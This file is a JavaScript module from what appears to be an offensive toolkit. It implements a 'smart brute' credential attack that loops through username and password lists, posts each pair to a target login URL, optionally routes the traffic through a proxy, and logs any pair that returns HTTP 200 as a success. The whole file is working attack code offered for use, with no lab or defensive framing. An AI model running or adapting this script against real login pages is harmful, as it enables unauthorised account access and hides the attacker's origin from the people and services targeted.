const axios = require('axios');
const chalk = require('chalk');
const proxySupport = require('./proxy_support');
const sessionLogger = require('./session_logger');

async function brute(config, sessionLog) {
    const { targetUrl, usernames, passwords, delayMs, maxAttempts, useProxy } = config.smartBrute;
    const results = [];
    let attempts = 0;

    const axiosInstance = useProxy ? proxySupport.createProxyAxios(config.proxy) : axios;

    for (const username of usernames) {
        for (const password of passwords) {
            if (attempts >= maxAttempts) break;
            const logEntry = await sessionLogger.log(config, {
                operation: 'smart_brute_attempt',
                details: `Testing ${username}:${password}`
            });
            sessionLog.push(logEntry);
            try {
                const response = await axiosInstance.post(targetUrl, { username, password }, { timeout: 5000 });
                results.push({
                    operation: 'smart_brute',
                    target: `${username}:${password}`,
                    result: response.status === 200 ? 'Success' : 'Failed',
                    timestamp: new Date().toISOString(),
                    error: ''
                });
                console.log(chalk.cyan(`[ATTEMPT] ${username}:${password} -> ${response.status}`));
                sessionLog.push(await sessionLogger.log(config, {
                    operation: 'smart_brute_result',
                    details: `Status: ${response.status}`
                }));
            } catch (err) {
                results.push({
                    operation: 'smart_brute',
                    target: `${username}:${password}`,
                    result: 'Failed',
                    timestamp: new Date().toISOString(),
                    error: err.message
                });
                console.error(chalk.red(`[ERROR] ${username}:${password} -> ${err.message}`));
                sessionLog.push(await sessionLogger.log(config, {
                    operation: 'smart_brute_error',
                    details: `Error: ${err.message}`
                }));
            }
            await new Promise(resolve => setTimeout(resolve, delayMs));
            attempts++;
        }
    }
    return results;
}

module.exports = { brute };